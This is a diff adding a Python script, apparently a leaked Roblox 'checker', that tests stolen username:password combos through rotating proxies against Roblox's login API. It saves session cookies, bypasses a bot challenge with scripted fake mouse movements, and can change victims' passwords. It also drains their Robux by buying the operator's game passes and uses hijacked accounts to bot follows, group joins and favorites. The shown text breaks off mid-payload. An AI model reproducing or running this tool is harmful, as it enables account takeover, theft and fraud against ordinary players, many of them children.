@@ -1,0 +1,2683 @@
+import configparser
+import base64
+import json
+from curl_cffi import requests
+import random
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.hazmat.backends import default_backend
+import time
+import colorama
+from colorama import init, Fore, Style
+from pystyle import Colors, Colorate, Center, Write
+from datetime import datetime
+from bs4 import BeautifulSoup
+from concurrent.futures import ThreadPoolExecutor
+import threading
+from clear_screen import clear
+
+lock = threading.Lock()
+valid_file = "results/valid_accounts.txt"
+invalid_file = "results/invalid_accounts.txt"
+locked_file = "results/locked_accounts.txt"
+twofa_file = "results/2fa_required.txt"
+robuxfile1 = "results/Robux1-100.txt"
+robuxfile2 = "results/Robux100-500.txt"
+robuxfile3 = "results/Robux500-1000.txt"
+robuxfile4 = "results/Robux1000-5000.txt"
+robuxfile5 = "results/Robux10k+.txt"
+korbloxfile = "results/korblox.txt"
+headlessfile = "results/headless.txt"
+rapfile1 = "results/Rap1-1000.txt"
+rapfile2 = "results/Rap1k+.txt"
+ps99file = "results/ps99gps.txt"
+adoptmefile = "results/adoptmegps.txt"
+mm2file = "results/mm2gps.txt"
+petsgofile = "results/petsgogps.txt"
+creditsfile = "results/credit1-1000.txt"
+premiumfile = "results/premium.txt"
+
+combo_file = 'combo.txt'
+proxy_file = 'proxies.txt'
+max_retries = 3
+retry_delay = 0.25
+robucx = 0
+hits = 0
+twofac = 0
+bad = 0
+totalrbx = 0
+proxiez = 0
+comboz = 0
+locked = 0
+captcha = 0
+stop_ui = False
+init(autoreset=True)
+config = configparser.ConfigParser()
+
+config.read('config.ini')
+
+
+
+dofollow = config.getboolean('botter', 'FollowBot')
+followid = config.getint('botter', 'FollowID')
+dopremium = config.getboolean('capture', 'premium')
+dorap = config.getboolean('capture', 'rap')
+dorobux = config.getboolean('capture', 'robux')
+dototal_robux = config.getboolean('capture', 'totalrobux')
+dojoin_date = config.getboolean('capture', 'joindate')
+docookie = config.getboolean('capture', 'cookie')
+docountry = config.getboolean('capture', 'country')
+dogp = config.getboolean('capture', 'CaptureGamePass')
+dops99gp = config.getboolean('capture', 'CapturePS99GamePasses')
+dopetsgogp = config.getboolean('capture', 'CapturePetsGoGamePasses')
+doadoptmegp = config.getboolean('capture', 'CaptureAdoptMeGamePasses')
+domm2 = config.getboolean('capture', 'CaptureMM2GamePasses')
+dokorblox = config.getboolean('capture', 'CaptureKorblox')
+dogroupjoin = config.getboolean('botter', 'Groupjoiner')
+groupid = config.getint('botter', 'Groupid')
+doassetbot = config.getboolean('botter', 'AssetBotter')
+assetid_str = config.get('botter', 'AssetId')
+assetid = json.loads(assetid_str)
+dostealrbx = config.getboolean('robuxstealer', 'Stealrobux')
+SellerId = config.getint('robuxstealer', 'SellerId')
+GamePassId2 = config.getint('robuxstealer', 'GamePassId2')
+GamePassId3 = config.getint('robuxstealer', 'GamePassId5')
+GamePassId4 = config.getint('robuxstealer', 'GamePassId5')
+GamePassId6 = config.getint('robuxstealer', 'GamePassId5')
+GamePassId7 = config.getint('robuxstealer', 'GamePassId5')
+GamePassId8 = config.getint('robuxstealer', 'GamePassId5')
+GamePassId9 = config.getint('robuxstealer', 'GamePassId5')
+GamePassId5 = config.getint('robuxstealer', 'GamePassId5')
+
+GamePassId10 = config.getint('robuxstealer', 'GamePassId10')
+GamePassId25 = config.getint('robuxstealer', 'GamePassId25')
+GamePassId50 = config.getint('robuxstealer', 'GamePassId50')
+GamePassId75 = config.getint('robuxstealer', 'GamePassId50')
+GamePassId100 = config.getint('robuxstealer', 'GamePassId50')
+GamePassId150 = config.getint('robuxstealer', 'GamePassId50')
+GamePassId175 = config.getint('robuxstealer', 'GamePassId50')
+GamePassId200 = config.getint('robuxstealer', 'GamePassId50')
+GamePassId250 = config.getint('robuxstealer', 'GamePassId50')
+docredits = config.getboolean('capture', 'CaptureCredits')
+dopswchange = config.getboolean('Changer', 'ChangedPassword')
+password1 = config.get('Changer', 'Password')
+
+
+with open(combo_file, 'r', errors="ignore") as f:
+    combos = [line.strip() for line in f.readlines() if ':' in line]
+    comboz = len(combos)
+
+with open(proxy_file, 'r') as f:
+    proxies_list = ['http://' + line.strip() for line in f.readlines() if line.strip()]
+    proxiez = len(proxies_list)
+
+
+class Logger:
+
+    @staticmethod
+    def Log(log_type, message, color, **kwargs):
+        timestamp = datetime.fromtimestamp(time.time()).strftime("%H:%M:%S")
+
+        output_message = f"{Colors.dark_gray}{timestamp} » {color}{log_type} {Colors.dark_gray}• {Colors.white}{message}"
+
+        if kwargs:
+            output_message += f"{Colors.dark_gray} \u2794"
+            for key, value in kwargs.items():
+                output_message += f" {Colors.white}{key} [{color}{value}{Colors.white}]"
+
+        output_message += f" {Colors.white}{Style.RESET_ALL}"
+
+        print(output_message)
+        print(Colorate.Horizontal(Colors.green_to_cyan, f"Leaked by a brainless rat"))
+
+    @staticmethod
+    def w_Input(message):
+        timestamp = f"{Fore.LIGHTBLACK_EX}{datetime.now().strftime('%H:%M:%S')}{Fore.RESET}" # credit this to 
+        return input(
+            f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}{timestamp}{Fore.LIGHTBLACK_EX}] {Fore.LIGHTMAGENTA_EX}[INPUT] {Fore.RESET}{message}: ")
+
+
+colorama.init(autoreset=True)
+
+def is_valid_int(value):
+    try:
+        return int(value)
+    except (ValueError, TypeError):
+        return None
+
+def is_valid_bool(value):
+    if isinstance(value, bool):
+        return value
+    elif isinstance(value, str):
+        return value.lower() == 'true'
+    return False
+
+def display_static_ui():
+    global robucx, hits, twofac, bad, totalrbx, proxiez, comboz, locked, captcha, stop_ui
+
+    while not stop_ui:
+        clear()
+
+        print("")
+        print(Colorate.Horizontal(Colors.purple_to_blue,
+                                  "------------------------------------------------------------------------------------.",
+                                  1))
+
+        print(Colorate.Horizontal(Colors.green_to_blue, f"Combos : {comboz}", 1))
+        print(Colorate.Horizontal(Colors.green_to_blue, f"Proxies : {proxiez}", 1))
+
+        print(Colorate.Horizontal(Colors.purple_to_blue,
+                                  "------------------------------------------------------------------------------------.",
+                                  1))
+
+        print(Colorate.Horizontal(Colors.green_to_cyan, f"Hits : {hits}", 1))
+        print(Colorate.Horizontal(Colors.red_to_purple, f"Bad : {bad}", 1))
+        print(Colorate.Horizontal(Colors.purple_to_blue, f"2factor : {twofac}", 1))
+        print(Colorate.Horizontal(Colors.yellow_to_green, f"Locked : {locked}", 1))
+        print(Colorate.Horizontal(Colors.yellow_to_green, f"Captcha : {captcha}", 1))
+
+        print(Colorate.Horizontal(Colors.purple_to_blue,
+                                  "------------------------------------------------------------------------------------.",
+                                  1))
+
+        print(Colorate.Horizontal(Colors.green_to_cyan, f"Robux : {robucx}", 1))
+        print(Colorate.Horizontal(Colors.green_to_cyan, f"Currency purchases : {totalrbx}", 1))
+        print(Colorate.Horizontal(Colors.green_to_cyan, f"Leaked by a brainless rat"))
+
+        print(Colorate.Horizontal(Colors.purple_to_blue,
+                                  "------------------------------------------------------------------------------------.",
+                                  1))
+
+        time.sleep(1)
+
+
+def get_random_proxy():
+    return random.choice(proxies_list)
+
+
+def save_to_file(file_path, content):
+    with lock:
+        with open(file_path, 'a') as f:
+            f.write(content)
+
+
+def get_csrf_token(session, max_retries=10):
+    try:
+        csrf_url = "https://www.roblox.com/"
+        headers_csrf = {
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Content-Type": "application/json;charset=UTF-8",
+            "Origin": "https://www.roblox.com",
+            "Referer": "https://www.roblox.com/",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+        }
+
+        for attempt in range(max_retries):
+            try:
+                response_csrf = session.get(csrf_url, headers=headers_csrf)
+                response_csrf.raise_for_status()
+                soup = BeautifulSoup(response_csrf.text, 'html.parser')
+                csrf_meta = soup.find('meta', attrs={'name': 'csrf-token'})
+
+                csrf_token = csrf_meta['data-token'] if csrf_meta else None
+                if csrf_token:
+                    return csrf_token
+            except Exception as e:
+                time.sleep(1)
+
+        print("Proxy timeout either blocked or just regular timeout of proxy")
+        return None
+    except Exception as e:
+        print(e)
+
+
+def gen_key_pair():
+    priv_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
+    pub_key = priv_key.public_key()
+    return priv_key, pub_key
+
+
+def get_spki(pub_key):
+    spki_bytes = pub_key.public_bytes(
+        encoding=serialization.Encoding.DER,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo
+    )
+    return base64.b64encode(spki_bytes).decode('utf-8')
+
+
+def sign_data(priv_key, data):
+    signature = priv_key.sign(data, ec.ECDSA(hashes.SHA256()))
+    return base64.b64encode(signature).decode('utf-8')
+
+
+def login_attempt(combo, uistyle):
+    global robucx, hits, twofac, bad, totalrbx, proxiez, comboz, locked, captcha
+    global dofollow, dopremium, dorap, dorobux, dototal_robux, dojoin_date, docookie, docountry, dogp, dops99gp, domm2, doadoptmegp, dopetsgogp
+    current_proxy = get_random_proxy()
+
+    session = requests.Session(impersonate="chrome")
+    session.proxies = {
+        "http": current_proxy,
+        "https": current_proxy
+    }
+
+
+    csrf_token = get_csrf_token(session)
+
+    if csrf_token:
+        pass
+    else:
+        print("Failed to fetch CSRF token.")
+        return
+
+    user, password = combo.split(':')
+
+    req = session.get(url="https://apis.roblox.com/hba-service/v1/getServerNonce")
+    servernonce = req.text.strip('"')
+
+    unix = int(time.time())
+    priv_key, pub_key = gen_key_pair()
+    client_pub_key = get_spki(pub_key)
+    data = f"{client_pub_key}{unix}{servernonce}".encode()
+    sai_signature = sign_data(priv_key, data)
+
+    login_url = "https://auth.roblox.com/v2/login"
+    headers_login = {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/json;charset=UTF-8",
+        "Origin": "https://www.roblox.com",
+        "Priority": "u=1, i",
+        "DNT": "1",
+        "Pragma": "no-cache",
+        "Cache-Control": "max-age=0",
+        "Referer": "https://www.roblox.com/",
+        "Sec-CH-UA": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+        "Sec-CH-UA-Mobile": "?0",
+        "Sec-CH-UA-Platform": '"Windows"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-site",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+        "X-Csrf-Token": csrf_token,
+    }
+
+    login_payload = {
+        "ctype": "Username",
+        "cvalue": user,
+        "password": password,
+        "secureAuthenticationIntent": {
+            "clientPublicKey": client_pub_key,
+            "clientEpochTimestamp": unix,
+            "serverNonce": servernonce,
+            "saiSignature": sai_signature
+        }
+    }
+
+    response_login = session.post(login_url, json=login_payload, headers=headers_login)
+
+    if "Token Validation Failed" in response_login.text:
+        headers_login['X-Csrf-Token'] = response_login.headers.get('x-csrf-token')
+        response_login = session.post(login_url, json=login_payload, headers=headers_login)
+        if "twoStepVerificationData" in response_login.text:
+            with lock:
+                twofac += 1
+            save_to_file(twofa_file, f"{user}:{password}\n")
+            if uistyle == 1:
+                Logger.Log("2FA", "2FA found", Colors.yellow, Username=user)
+            else:
+                pass
+            return
+
+        if "displayName" in response_login.text or "An unexpected" in response_login.text:
+            with lock:
+                hits += 1
+            if uistyle == 1:
+                Logger.Log("VALID", "Valid account", Colors.green, Username=user)
+            else:
+                pass
+
+            response_data = json.loads(response_login.text)
+            user_id = response_data['user']['id']
+            roblosecurity_cookie = session.cookies.get('.ROBLOSECURITY')
+
+            robux = "Failed"
+            country = "Failed"
+
+            headers_robux = {
+                "Accept": "application/json, text/plain, */*",
+                "Accept-Encoding": "gzip, deflate, br, zstd",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Cookie": f".ROBLOSECURITY={roblosecurity_cookie}",
+                "Origin": "https://www.roblox.com",
+                "Referer": "https://www.roblox.com/",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+            }
+
+            robux_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
+
+            if dorobux == True:
+                for attempt in range(max_retries):
+                    try:
+                        robux_res = session.get(url=robux_url, headers=headers_robux)
+                        if robux_res.status_code == 200:
+                            response_data = json.loads(robux_res.text)
+                            robux = response_data.get('robux', "Failed")
+                            robucx += robux
+                            break
+                    except Exception as e:
+                        print(e)
+                    if attempt < max_retries - 1:
+                        time.sleep(retry_delay)
+            else:
+                robux = "Not captured"
+
+            HasKorblox = "Unknown"
+            HasHeadless = "Unknown"
+
+            if dokorblox:
+                try:
+                    url = f"https://catalog.roblox.com/v1/users/{user_id}/bundles/1?cursor=&limit=100&sortOrder=Desc"
+                    r = session.get(url, headers=headers_robux)
+                    if "Korblox Deathspeaker" in r.text:
+                        HasKorblox = True
+                    else:
+                        HasKorblox = False
+                    if "Headless Horseman" in r.text:
+                        HasHeadless = True
+                    else:
+                        HasHeadless = False
+                except Exception as e:
+                    HasKorblox = "Unknown"
+                    HasHeadless = "Unknown"
+                    print(e)
+
+            Joinedgroup = "Unknown"
+
+            if dogroupjoin:
+                url = f"https://groups.roblox.com/v1/groups/{groupid}/users"
+                payloaz = '{"sessionId":"","redemptionToken":""}'
+                r = session.post(url, headers=headers_robux, json=payloaz)
+                if "Token" in r.text:
+                    headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                    r = session.post(url, headers=headers_robux, json=payloaz)
+                    if r.text == "{}":
+                        Joinedgroup = True
+                    elif r.status_code == 403:
+                        Joinedgroup = "Captcha"
+                if r.text == "{}":
+                    Joinedgroup = True
+                if r.status_code == 403:
+                    Joinedgroup = "Captcha"
+
+            BottedAsset = "Unknown"
+            btdASsset = "chkr mad by gyew"
+
+            if doassetbot:
+                for _ in assetid:
+                    assetlink = f"https://catalog.roblox.com/v1/favorites/users/{user_id}/assets/{_}/favorite"
+                    r = session.post(assetlink, headers=headers_robux)
+                    if r.text == '{}':
+                        BottedAsset = True
+                    if r.status_code == 403:
+                        BottedAsset = "Captcha"
+                    if "Token" in r.text:
+                        headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                        r = session.post(assetlink, headers=headers_robux)
+                        if r.text == '{}':
+                            BottedAsset = True
+                        if r.status_code == 403:
+                            BottedAsset = "Captcha"
+                        else:
+                            BottedAsset = True
+                    else:
+                        BottedAsset = True
+
+            if dostealrbx and dorobux:
+                try:
+                    robux = int(robux)
+
+                    gamepass_options = {
+                        (2, 2): (GamePassId2, 2),
+                        (3, 3): (GamePassId3, 3),
+                        (4, 4): (GamePassId4, 4),
+                        (5, 5): (GamePassId5, 5),
+                        (6, 6): (GamePassId6, 6),
+                        (7, 7): (GamePassId7, 7),
+                        (8, 8): (GamePassId8, 8),
+                        (9, 9): (GamePassId2, 9),
+                        (10, 25): (GamePassId10, 10),
+                        (25, 50): (GamePassId25, 25),
+                        (50, 75): (GamePassId50, 50),
+                        (75, 100): (GamePassId75, 75),
+                        (100, 150): (GamePassId100, 100),
+                        (150, 175): (GamePassId150, 150),
+                        (175, 200): (GamePassId175, 175),
+                        (200, 250): (GamePassId200, 200),
+                        (250, float('inf')): (GamePassId250, 250),
+                    }
+
+                    selected_pass = next(
+                        ((id, price) for (low, high), (id, price) in gamepass_options.items() if low <= robux < high),
+                        None)
+
+                    if selected_pass is None:
+                        boughtrbx2 = "Biedak bez kasy"
+
+                    GamePassId, expected_price = selected_pass
+
+                    url = f"https://apis.roblox.com/game-passes/v1/game-passes/{GamePassId}/purchase"
+                    payload = {"expectedCurrency": 1, "expectedPrice": expected_price, "expectedSellerId": SellerId}
+
+                    response = session.post(url, headers=headers_robux, json=payload)
+                    print(response.text)
+
+                    if "token" in response.text:
+                        try:
+                            headers_robux["x-csrf-token"] = response.headers["x-csrf-token"]
+                        except Exception as e:
+                            print(e)
+
+                        response = session.post(url, headers=headers_robux, json=payload)
+
+                        if "Success" in response.text:
+                            boughtrbx2 = True
+                        elif response.status_code in (400, 403):
+                            boughtrbx2 = "Failed"
+                        else:
+                            boughtrbx2 = "Unknown response"
+
+                    if "Success" in response.text:
+                        boughtrbx2 = True
+                    elif response.status_code in (400, 403):
+                        boughtrbx2 = "Failed"
+                    else:
+                        boughtrbx2 = "Unknown response"
+
+                except Exception as e:
+                    print(e)
+                    boughtrbx2 = "error"
+
+            balancecredits = "e"
+            balancecurrency = "e"
+
+            if docredits:
+                try:
+                    r = session.get(url="https://apis.roblox.com/credit-balance/v1/get-credit-balance")
+                    if r.status_code == 404:
+                        balancecredits = "No credits"
+                        balancecurrency = "No credits"
+                    if r.status_code == 200:
+                        gayson = r.json()
+                        balancecredits = gayson["creditBalance"]
+                        balancecurrency = gayson["currencyCode"]
+                    else:
+                        print(r.text)
+                        balancecredits = "None"
+                        balancecurrency = "None"
+                except Exception:
+                    pass
+
+            if docountry == True:
+                for attempt in range(1, 4):
+                    try:
+                        url = "https://accountsettings.roblox.com/v1/account/settings/account-country"
+                        res = session.get(url, headers=headers_robux)
+                        if res.status_code == 200:
+                            data = json.loads(res.text)
+                            country = data['value']['countryName']
+                            break
+                    except Exception as e:
+                        pass
+            else:
+                country = "Not captured"
+
+            currencyurl = f"https://economy.roblox.com/v2/users/{user_id}/transactions?cursor=&limit=100&transactionType=CurrencyPurchase&itemPricingType=PaidAndLimited"
+            total_currency_purchased = 0
+
+            if dototal_robux == True:
+                try:
+                    while True:
+                        response = session.get(currencyurl, headers=headers_robux)
+                        data = json.loads(response.text)
+                        if "data" in data and data["data"]:
+                            transactions = data["data"]
+                            for transaction in transactions:
+                                if "currency" in transaction and "amount" in transaction["currency"]:
+                                    total_currency_purchased += transaction["currency"]["amount"]
+                                    totalrbx += total_currency_purchased
+                        cursor = data.get("nextPageCursor", None)
+                        if not cursor:
+                            break
+                except Exception as e:
+                    print(e)
+                    total_currency_purchased = "Failed"
+            else:
+                total_currency_purchased = "Not captured"
+
+            createdat = "Unknown"
+            if dojoin_date == True:
+                try:
+                    userurl = f"https://users.roblox.com/v1/users/{user_id}"
+                    usar = session.get(userurl, headers=headers_robux)
+                    if usar.status_code == 200:
+                        data = json.loads(usar.text)
+                        createdat = data["created"]
+                except Exception as e:
+                    createdat = "Failed"
+            else:
+                country = "Not captured"
+
+            premium = "Unknown"
+            if dopremium == True:
+                try:
+                    membershipurl = f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership"
+                    meb = session.get(membershipurl, headers=headers_robux)
+                    if meb.status_code == 200:
+                        premium = meb.text
+                except Exception as e:
+                    premium = "Failed"
+            else:
+                premium = "Not captured"
+
+            rap = 0
+            url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100'
+            if dorap == True:
+                try:
+                    request = session.get(url, headers=headers_robux).json()
+                    rap += sum(item.get('recentAveragePrice', 0) for item in request.get('data', []))
+                    url = request.get('nextPageCursor', None)
+                    if url:
+                        url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100&cursor={url}'
+                except Exception as e:
+                    rap = "Failed"
+            else:
+                rap = "Not captured"
+
+            followed = "Unknown"
+
+            if dofollow == True:
+                try:
+                    followurl = f"https://friends.roblox.com/v1/users/{followid}/follow"
+                    headers_robux["x-csrf-token"] = csrf_token
+                    re = session.post(followurl, headers=headers_robux)
+
+                    if "Token Val" in re.text:
+                        new_csrf_token = re.headers.get("x-csrf-token")
+                        if new_csrf_token:
+                            headers_robux["x-csrf-token"] = new_csrf_token
+                            re = session.post(followurl, headers=headers_robux)
+                            if 'success":true' in re.text:
+                                followed = "True"
+                            if 'isCaptchaRequired":true':
+                                followed = "Captcha"
+                        else:
+                            if 'success":true' in re.text:
+                                followed = "True"
+                            if 'isCaptchaRequired":true':
+                                followed = "Captcha"
+                    if 'success":true' in re.text:
+                        followed = "True"
+                except Exception as e:
+                    followed = "Failed"
+            else:
+                followed = "Not captured"
+
+            capgamepassurl = f"https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=1000&pageNumber=1&userId={user_id}"
+
+            gppricing = 0
+            petsgogpcount = 0
+            ps99gpcount = 0
+            mm2gpcount = 0
+            adoptmegpcount = 0
+
+            if dogp:
+                gppricing = 0
+                petsgogpcount = 0
+                ps99gpcount = 0
+                mm2gpcount = 0
+                adoptmegpcount = 0
+
+                ps99gps = [
+                    "Lucky! 🍀",
+                    "Ultra Lucky! 🍀✨",
+                    "VIP! ⭐",
+                    "Magic Eggs! ✨",
+                    "+15 Pets! 🐾",
+                    "Huge Hunter! 🔥",
+                    "Auto Farm! ♻️",
+                    "Auto Tap! ☝️",
+                    "Daycare Slots! 💖",
+                    "+15 Eggs! 🥚",
+                    "Super Drops! ⭐",
+                    "Double Stars"
+                ]
+
+                adoptmegps = [
+                    "VIP",
+                    "Premium Plots",
+                    "Millionaire Pack",
+                    "Celebrity Mansion",
+                    "Modern Mansion",
+                    "Hotdog Stand",
+                    "Cozy Home Lure",
+                    "Fossil Isle Returns Bundle",
+                    "Soccer Stadium",
+                    "School and Hospital Homes"
+                ]
+
+                mm2gps = [
+                    "Elite",
+                    "Radio",
+                    "GODLY: Spirit",
+                    "GODLY: Soul",
+                    "BUNDLE: Spirit & Soul"
+                ]
+
+                petsgogps  = [
+                    "VIP! 👑",
+                    "Ultra Lucky! 💎",
+                    "Lucky! 🍀",
+                    "Hyper Dice! ⚡",
+                    "Double Dice! 🎲🎲",
+                    "Double Coins! 💰",
+                    "+3 Pets! 🐾"
+                ]
+
+                try:
+                    getcapgp = session.get(capgamepassurl, headers=headers_robux)
+
+                    if getcapgp.status_code == 200:
+                        gamepass_data = getcapgp.json()
+
+                        if 'Data' in gamepass_data:
+                            for item in gamepass_data['Data'].get("Items", []):
+                                price = item.get("Product", {}).get("PriceInRobux", 0)
+                                gppricing += price
+
+                                item_name = item["Item"]["Name"]
+                                creator_name = item["Creator"]["Name"]
+
+                                if dops99gp and (item_name in ps99gps or creator_name == "BIG Games Pets"):
+                                    ps99gpcount += 1
+                                    gppricing += price
+
+                                if item_name in mm2gps and creator_name == "Nikilis":
+                                    mm2gpcount += 1
+                                    gppricing += price
+
+                                if item_name in petsgogps and creator_name == "BIG Games Pets":
+                                    petsgogpcount += 1
+                                    gppricing += price
+
+                                if item_name in adoptmegps and creator_name == "Uplift Games":
+                                    adoptmegpcount += 1
+                                    gppricing += price
+
+                        else:
+                            petsgogpcount = 0
+                            ps99gpcount = 0
+                            mm2gpcount = 0
+                            adoptmegpcount = 0
+                            gppricing = 0
+
+                    else:
+                        petsgogpcount = "Failed"
+                        ps99gpcount = "Failed"
+                        mm2gpcount = "Failed"
+                        adoptmegpcount = "Failed"
+                        gppricing = "Failed"
+
+                except Exception:
+                    pass
+
+            changedpassword = "Error"
+
+
+            if dopswchange:
+                try:
+                    url = "https://auth.roblox.com/v2/user/passwords/change"
+                    pay = {
+                        "currentPassword": password,
+                        "newPassword": password1
+                    }
+                    r = session.post(url, headers=headers_robux, json=pay)
+                    print(r.text)
+                    if "XSRF" or "Token" in r.text:
+                        headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                        r = session.post(url, headers=headers_robux, json=pay)
+                        print(r.text)
+                        if r.text == "{}":
+                            changedpassword = True
+                    elif r.text == "{}":
+                        changedpassword = True
+                    elif "Challenge" in r.text:
+                        changedpassword = "Captcha"
+                except Exception:
+                    changedpassword = "Error"
+
+
+
+
+
+            if docookie == True:
+                capcook = True
+            else:
+                capcook = False
+
+            final_data = f"{user}:{password} | "
+
+            if dorobux:
+                final_data += f"Robux: {robux} | "
+            if docountry:
+                final_data += f"Country: {country} | "
+            if dototal_robux:
+                final_data += f"Purchased Robux: {total_currency_purchased} | "
+            if dorap:
+                final_data += f"RAP: {rap} | "
+            if dopremium:
+                final_data += f"Premium: {premium} | "
+            if dojoin_date:
+                final_data += f"Registered at: {createdat} | "
+            if dofollow:
+                final_data += f"Followed acc: {followed} | "
+            if dogp:
+                final_data += f"Total gamepass prices: {gppricing} | "
+            if dops99gp:
+                final_data += f"Total ps99 gamepasses: {ps99gpcount} | "
+            if dopetsgogp:
+                final_data += f"Total pets go gamepasses: {petsgogpcount} | "
+            if domm2:
+                final_data += f"Total mm2 gamepasses: {mm2gpcount} | "
+            if doadoptmegp:
+                final_data += f"Total adoptme gamepasses: {adoptmegpcount} | "
+            if dokorblox:
+                final_data += f"Has korblox: {HasKorblox} | "
+            if dokorblox:
+                final_data += f"Has headless: {HasHeadless} | "
+            if dogroupjoin:
+                final_data += f"Joined group: {Joinedgroup} | "
+            if doassetbot:
+                final_data += f"Botted asset favorites: {BottedAsset} | "
+            if docredits:
+                final_data += f"Credit balance: {balancecredits} | "
+            if docredits:
+                final_data += f"Credit currency: {balancecurrency} | "
+            if docookie:
+                final_data += f".ROBLOSECURITY: {roblosecurity_cookie} | "
+
+            final_data = final_data.rstrip(" | ") + "\n"
+
+            try:
+                save_to_file(valid_file, final_data)
+
+                if is_valid_bool(HasKorblox) is True:
+                    save_to_file(korbloxfile, final_data)
+
+                if is_valid_bool(HasHeadless) is True:
+                    save_to_file(headlessfile, final_data)
+
+                rap_value = is_valid_int(rap)
+                if rap_value is not None:
+                    if 1 <= rap_value <= 1000:
+                        save_to_file(rapfile1, final_data)
+                    elif rap_value > 1000:
+                        save_to_file(rapfile2, final_data)
+
+                ps99gp_value = is_valid_int(ps99gpcount)
+                if ps99gp_value is not None and ps99gp_value > 1:
+                    save_to_file(ps99file, final_data)
+
+                adoptmegp_value = is_valid_int(adoptmegpcount)
+                if adoptmegp_value is not None and adoptmegp_value > 1:
+                    save_to_file(adoptmefile, final_data)
+
+                mm2gp_value = is_valid_int(mm2gpcount)
+                if mm2gp_value is not None and mm2gp_value > 1:
+                    save_to_file(mm2file, final_data)
+
+                petsgogp_value = is_valid_int(petsgogpcount)
+                if petsgogp_value is not None and petsgogp_value > 1:
+                    save_to_file(petsgofile, final_data)
+
+                credits_value = is_valid_int(balancecredits)
+                if credits_value is not None and credits_value > 1:
+                    save_to_file(creditsfile, final_data)
+
+                if is_valid_bool(premium) is True:
+                    save_to_file(premiumfile, final_data)
+
+                if 1 <= robux < 101:
+                    save_to_file(robuxfile1, final_data)
+                elif 101 <= robux < 500:
+                    save_to_file(robuxfile2, final_data)
+                elif 500 <= robux < 1000:
+                    save_to_file(robuxfile3, final_data)
+                elif 1000 <= robux < 5000:
+                    save_to_file(robuxfile4, final_data)
+                elif robux >= 10000:
+                    save_to_file(robuxfile5, final_data)
+
+            except Exception as e:
+                print(e)
+
+            return
+
+
+
+        elif "Incorrect" in response_login.text:
+            with lock:
+                bad += 1
+            save_to_file(invalid_file, f"{user}:{password}\n")
+            if uistyle == 1:
+                Logger.Log("BAD", "Bad credentials", Colors.red, Username=user)
+            else:
+                pass
+            return
+
+        elif 'rblx-challenge-type' in response_login.headers and response_login.headers[
+            'rblx-challenge-type'] == 'captcha':
+            with lock:
+                captcha += 1
+            if uistyle == 1:
+                Logger.Log("CAPTCHA", "Captcha", Colors.yellow, Username=user)
+            else:
+                pass
+            return
+
+
+        elif "Account has" in response_login.text:
+            with lock:
+                locked += 1
+            save_to_file(locked_file, f"{user}:{password}")
+            if uistyle == 1:
+                Logger.Log("LOCKED", "Accoiunt locked", Colors.cyan, Username=user)
+            else:
+                pass
+            return
+
+        elif 'rblx-challenge-type' in response_login.headers and response_login.headers[
+            'rblx-challenge-type'] == 'rostile':
+            challenge_metadata_b64 = response_login.headers.get('rblx-challenge-metadata')
+
+            if challenge_metadata_b64:
+                challenge_metadata_decoded = base64.b64decode(challenge_metadata_b64).decode('utf-8')
+
+                challenge_metadata_json = json.loads(challenge_metadata_decoded)
+
+                challenge_id = challenge_metadata_json.get("challengeId")
+
+                headers = headers_login
+                payload = f'{{"challengeId": "{challenge_id}", "solution": {{"buttonClicked": true, "click": {{"x": 989, "y": 503, "timestamp": 10850, "duration": 87}}, "completionTime": 1698, "mouseMovements": [{{"x": 1221, "y": 944, "timestamp": 9535}}, {{"x": 1205, "y": 922, "timestamp": 9557}}, {{"x": 1192, "y": 906, "timestamp": 9585}}, {{"x": 1189, "y": 902, "timestamp": 10092}}, {{"x": 1165, "y": 872, "timestamp": 10119}}, {{"x": 1136, "y": 836, "timestamp": 10140}}, {{"x": 1105, "y": 797, "timestamp": 10161}}, {{"x": 1069, "y": 748, "timestamp": 10188}}, {{"x": 1053, "y": 726, "timestamp": 10210}}, {{"x": 1044, "y": 714, "timestamp": 10237}}, {{"x": 1042, "y": 710, "timestamp": 10260}}, {{"x": 1039, "y": 705, "timestamp": 10283}}, {{"x": 1036, "y": 699, "timestamp": 10306}}, {{"x": 1033, "y": 692, "timestamp": 10328}}, {{"x": 1029, "y": 683, "timestamp": 10355}}, {{"x": 1027, "y": 675, "timestamp": 10376}}, {{"x": 1022, "y": 663, "timestamp": 10403}}, {{"x": 1019, "y": 651, "timestamp": 10425}}, {{"x": 1013, "y": 631, "timestamp": 10453}}, {{"x": 1008, "y": 610, "timestamp": 10479}}, {{"x": 1005, "y": 594, "timestamp": 10500}}, {{"x": 1003, "y": 577, "timestamp": 10521}}, {{"x": 1001, "y": 560, "timestamp": 10543}}, {{"x": 998, "y": 545, "timestamp": 10564}}, {{"x": 995, "y": 530, "timestamp": 10589}}, {{"x": 994, "y": 522, "timestamp": 10611}}, {{"x": 992, "y": 513, "timestamp": 10636}}, {{"x": 991, "y": 507, 